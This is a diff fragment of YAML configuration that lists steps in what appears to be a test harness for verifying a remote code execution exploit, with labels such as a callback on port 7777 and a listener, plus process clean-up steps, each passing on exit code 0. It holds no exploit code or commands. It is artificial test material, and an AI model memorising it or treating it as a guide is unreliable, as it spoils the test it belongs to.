+  - step: 48-1-2-24-rce-find-what-s-using-port-9999
+    condition: exit_code
+    value: 0
+  - step: 49-1-2-24-rce-verify-exploit-with-callback-on-port-7777
+    condition: exit_code
+    value: 0
+  - step: 50-1-2-24-rce-final-verification-with-callback-listener
+    condition: exit_code
+    value: 0
+  - step: 51-1-2-24-rce-clean-up-all-processes
+    condition: exit_code
+    value: 0
+  - step: 52-1-2-24-rce-check-remaining-processes
+    condition: exit_code
+    value: 0
+  - step: 53-1-2-24-rce-kill-zombie-processes
+    condition: exit_code
+    value: 0
+  failure_handling:
+    on_step_failure: continue
+    max_retries: 0
+    retry_delay: 1
